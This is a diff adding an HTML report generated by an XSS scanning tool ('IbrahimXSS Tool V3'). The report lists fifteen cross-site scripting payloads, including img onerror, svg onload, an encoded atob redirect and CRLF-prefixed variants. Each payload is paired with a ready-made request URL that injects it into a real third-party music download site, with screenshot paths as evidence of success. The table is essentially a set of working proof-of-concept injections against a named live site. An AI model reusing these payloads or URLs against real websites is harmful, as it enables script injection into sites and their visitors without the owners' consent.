@@ -1,0 +1,303 @@
+
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <style>
+            body {
+                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+                margin: 0;
+                padding: 20px;
+                background-color: #000;
+                color: #00ff00;
+            }
+            h1, h2 {
+                color: #00ff00;
+                text-align: center;
+            }
+            .header {
+                display: flex;
+                justify-content: space-between;
+                padding: 10px 20px;
+                border-bottom: 2px solid #00ff00;
+                margin-bottom: 20px;
+                background-color: #333;
+            }
+            .header .left a {
+                color: #00ff00;
+                font-size: 18px;
+                text-decoration: none;
+            }
+            .header .right {
+                color: #00ff00;
+                font-size: 18px;
+            }
+            table {
+                width: 100%;
+                border-collapse: collapse;
+                margin-top: 20px;
+                background-color: #000;
+            }
+            th, td {
+                border: 1px solid #00ff00;
+                padding: 10px;
+                text-align: left;
+            }
+            th {
+                background-color: #004400;
+                color: #00ff00;
+            }
+            tr:nth-child(even) {
+                background-color: #1a1a1a;
+            }
+            tr:hover {
+                background-color: #333;
+                transition: background-color 0.3s ease;
+            }
+            a {
+                color: #1e90ff;
+                text-decoration: none;
+            }
+            a:hover {
+                text-decoration: underline;
+            }
+            .payload {
+                color: #e67e22;
+                font-weight: bold;
+            }
+            img.zoomable {
+                height: 100px;
+                cursor: pointer;
+                transition: transform 0.3s ease-in-out;
+            }
+            img.zoomable:hover {
+                transform: scale(1.2);
+            }
+            .modal {
+                display: none;
+                position: fixed;
+                z-index: 1000;
+                padding-top: 60px;
+                left: 0;
+                top: 0;
+                width: 100%;
+                height: 100%;
+                overflow: auto;
+                background-color: rgba(0, 0, 0, 0.9);
+            }
+            .modal-content {
+                margin: auto;
+                display: block;
+                width: 80%;
+                max-width: 700px;
+            }
+            .close {
+                position: absolute;
+                top: 15px;
+                right: 35px;
+                color: #fff;
+                font-size: 40px;
+                font-weight: bold;
+            }
+            .close:hover, .close:focus {
+                color: #bbb;
+                cursor: pointer;
+            }
+        </style>
+                    <script src='https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.4.0/jspdf.umd.min.js'></script>
+                    <script>
+            document.addEventListener('DOMContentLoaded', function() {
+                const rows = document.querySelectorAll('.report-row');
+                rows.forEach(row => {
+                    row.addEventListener('click', () => {
+                        row.classList.toggle('highlight');
+                    });
+                });
+
+                const modal = document.getElementById('modal');
+                const modalImg = document.getElementById('modal-image');
+                const images = document.querySelectorAll('.zoomable');
+                const span = document.getElementsByClassName('close')[0];
+
+                let timer;
+
+                images.forEach(image => {
+                    image.addEventListener('mouseover', function() {
+                        clearTimeout(timer);
+                        modal.style.display = 'block';
+                        modalImg.src = this.src;
+                    });
+
+                    image.addEventListener('mouseout', function() {
+                        timer = setTimeout(() => {
+                            modal.style.display = 'none';
+                        }, 2000);
+                    });
+                });
+
+                span.onclick = function() { 
+                    modal.style.display = 'none';
+                    clearTimeout(timer);
+                };
+
+                window.onclick = function(event) {
+                    if (event.target == modal) {
+                        modal.style.display = 'none';
+                        clearTimeout(timer);
+                    }
+                };
+
+                document.getElementById('download-pdf').addEventListener('click', downloadPDF);
+            });
+
+            function downloadPDF() {
+                const { jsPDF } = window.jspdf;
+                const doc = new jsPDF();
+                const elementHTML = document.getElementById('report-table').outerHTML;
+                const filename = document.getElementById('download-pdf').getAttribute('data-filename');
+                doc.html(elementHTML, {
+                    callback: function (doc) {
+                        doc.save(filename);
+                    },
+                    x: 10,
+                    y: 10,
+                });
+            }
+        </script>
+                </head>
+            
+                <body>
+                    <div class='header'>
+                        <div class='left'>
+                            <a href='https://www.linkedin.com/in/ibrahim-husi%C4%87-101430102/' target='_blank'>LinkedIn Profile of Ibrahim</a>
+                        </div>
+                        <div class='right'>
+                            <span>#IbrahimXSS Tool V3</span>
+                        </div>
+                    </div>
+                    <h1 class='report-title'>Report 06/19/2024 10:18</h1>
+                    <h2>Found: 15 items</h2>
+                    <button id='download-pdf' data-filename='report-2024_6_19_10_18_32_999.pdf'>Download as PDF</button>
+                    <table id='report-table'>
+                        <thead>
+                            <tr>
+                                <th>Index</th>
+                                <th>Image</th>
+                                <th>Payload</th>
+                                <th>Request</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                <tr class='report-row'>
+                    <td>1</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_10_18_32_933.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));></td>
+                    <td><a target='_blank' class='request-link' href='https://indiamp3.net/download/telugu-mp3-songs/1&quot;>&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));>.html'>https://indiamp3.net/download/telugu-mp3-songs/1&quot;&gt;&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;.html</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>2</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_10_18_39_114.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>window.name=&quot;&lt;img src=x onerror=alert(23)>&quot;</td>
+                    <td><a target='_blank' class='request-link' href='https://indiamp3.net/download/telugu-mp3-songs/1window.name=&quot;&lt;img src=x onerror=alert(23)>&quot;.html'>https://indiamp3.net/download/telugu-mp3-songs/1window.name=&quot;&lt;img src=x onerror=alert(23)&gt;&quot;.html</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>3</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_10_18_39_264.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;&#39;>&lt;img src=q onerror=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='https://indiamp3.net/download/telugu-mp3-songs/1&quot;&#39;>&lt;img src=q onerror=alert(1)>.html'>https://indiamp3.net/download/telugu-mp3-songs/1&quot;&#39;&gt;&lt;img src=q onerror=alert(1)&gt;.html</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>4</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_10_18_39_681.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;svg id=alert(1) onload=eval(id)></td>
+                    <td><a target='_blank' class='request-link' href='https://indiamp3.net/download/telugu-mp3-songs/1&lt;svg id=alert(1) onload=eval(id)>.html'>https://indiamp3.net/download/telugu-mp3-songs/1&lt;svg id=alert(1) onload=eval(id)&gt;.html</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>5</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_10_18_39_906.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;svg onload=prompt(document.domain);>.asp</td>
+                    <td><a target='_blank' class='request-link' href='https://indiamp3.net/download/telugu-mp3-songs/1&quot;>&lt;svg onload=prompt(document.domain);>.asp.html'>https://indiamp3.net/download/telugu-mp3-songs/1&quot;&gt;&lt;svg onload=prompt(document.domain);&gt;.asp.html</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>6</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_10_18_40_564.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>%E5%98%8D%E5%98%8A%20&quot;>&lt;img src=q onerror=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='https://indiamp3.net/download/telugu-mp3-songs/1%E5%98%8D%E5%98%8A%20&quot;>&lt;img src=q onerror=alert(1)>.html'>https://indiamp3.net/download/telugu-mp3-songs/1%E5%98%8D%E5%98%8A%20&quot;&gt;&lt;img src=q onerror=alert(1)&gt;.html</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>7</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_10_18_41_579.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;BODY ONLOAD=javascript:alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='https://indiamp3.net/download/telugu-mp3-songs/1&lt;BODY ONLOAD=javascript:alert(1)>.html'>https://indiamp3.net/download/telugu-mp3-songs/1&lt;BODY ONLOAD=javascript:alert(1)&gt;.html</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>8</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_10_18_41_877.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>-->&lt;svg onload=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='https://indiamp3.net/download/telugu-mp3-songs/1-->&lt;svg onload=alert(1)>.html'>https://indiamp3.net/download/telugu-mp3-songs/1--&gt;&lt;svg onload=alert(1)&gt;.html</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>9</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_10_18_42_270.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>1&#39;)&quot;&lt;!-->&lt;Svg OnLoad=(confirm)(1)&lt;!--</td>
+                    <td><a target='_blank' class='request-link' href='https://indiamp3.net/download/telugu-mp3-songs/11&#39;)&quot;&lt;!-->&lt;Svg OnLoad=(confirm)(1)&lt;!--.html'>https://indiamp3.net/download/telugu-mp3-songs/11&#39;)&quot;&lt;!--&gt;&lt;Svg OnLoad=(confirm)(1)&lt;!--.html</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>10</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_10_18_42_329.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;image src =q onerror=prompt(8)></td>
+                    <td><a target='_blank' class='request-link' href='https://indiamp3.net/download/telugu-mp3-songs/1&lt;image src =q onerror=prompt(8)>.html'>https://indiamp3.net/download/telugu-mp3-songs/1&lt;image src =q onerror=prompt(8)&gt;.html</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>11</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_10_18_43_332.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>%3F%20&quot;>&lt;svg onload=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='https://indiamp3.net/download/telugu-mp3-songs/1%3F%20&quot;>&lt;svg onload=alert(1)>.html'>https://indiamp3.net/download/telugu-mp3-songs/1%3F%20&quot;&gt;&lt;svg onload=alert(1)&gt;.html</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>12</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_10_18_43_812.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`></td>
+                    <td><a target='_blank' class='request-link' href='https://indiamp3.net/download/telugu-mp3-songs/1&lt;img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`>.html'>https://indiamp3.net/download/telugu-mp3-songs/1&lt;img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`&gt;.html</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>13</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_10_18_44_394.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz</td>
+                    <td><a target='_blank' class='request-link' href='https://indiamp3.net/download/telugu-mp3-songs/1anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz.html'>https://indiamp3.net/download/telugu-mp3-songs/1anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz.html</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>14</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_10_18_44_609.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>%0d%0a%20&quot;>&lt;img src=q onerror=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='https://indiamp3.net/download/telugu-mp3-songs/1%0d%0a%20&quot;>&lt;img src=q onerror=alert(1)>.html'>https://indiamp3.net/download/telugu-mp3-songs/1%0d%0a%20&quot;&gt;&lt;img src=q onerror=alert(1)&gt;.html</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>15</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_10_18_45_791.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;img src=x onerror=&quot;prompt(document.domain);&quot;></td>
+                    <td><a target='_blank' class='request-link' href='https://indiamp3.net/download/telugu-mp3-songs/1&quot;>&lt;img src=x onerror=&quot;prompt(document.domain);&quot;>.html'>https://indiamp3.net/download/telugu-mp3-songs/1&quot;&gt;&lt;img src=x onerror=&quot;prompt(document.domain);&quot;&gt;.html</a></td>
+                </tr>
+            </tbody>
+                    </table>
+                    <div id='modal' class='modal'>
+                        <span class='close'>&times;</span>
+                        <img class='modal-content' id='modal-image'>
+                        <div id='caption'></div>
+                    </div>
+                </body>
+                </html>
+            
